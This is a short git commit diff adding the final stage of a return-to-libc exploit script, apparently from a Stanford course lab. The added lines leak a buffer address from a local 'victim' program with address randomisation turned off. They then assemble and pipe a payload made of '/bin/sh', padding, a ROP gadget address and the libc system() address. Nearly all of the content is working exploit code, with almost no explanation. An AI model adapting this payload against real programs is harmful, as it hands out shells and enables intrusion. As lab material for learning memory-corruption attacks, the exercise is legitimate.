17da262beda6f61d5658fad2c395858d5223a8cc
root <root@localhost.localdomain>
2016-10-13 14:59:13 +0000

    youhu

--- crypto.stanford.edu/get-element.sh
+++ crypto.stanford.edu/get-element.sh
@@ -11,3 +11,10 @@ echo ...offset gadget : $gadget
 
 system=0x$(nm -D $libc | grep '\<system\>' | cut -f1 -d' ')
 echo ...system : $system
+
+addr=$(echo | setarch $(arch) -R ./victim | sed 1q)
+echo ...name[64] : $addr
+
+echo "Attaque !"
+(echo -n 2f62696e2f7368; printf %0130d 0; printf %016x $((base+gadget)) | tac -rs..; printf %016x $((addr)) | tac -rs..; printf %016x $((base+system)) | tac -rs..) | xxd -r -p | cat
+
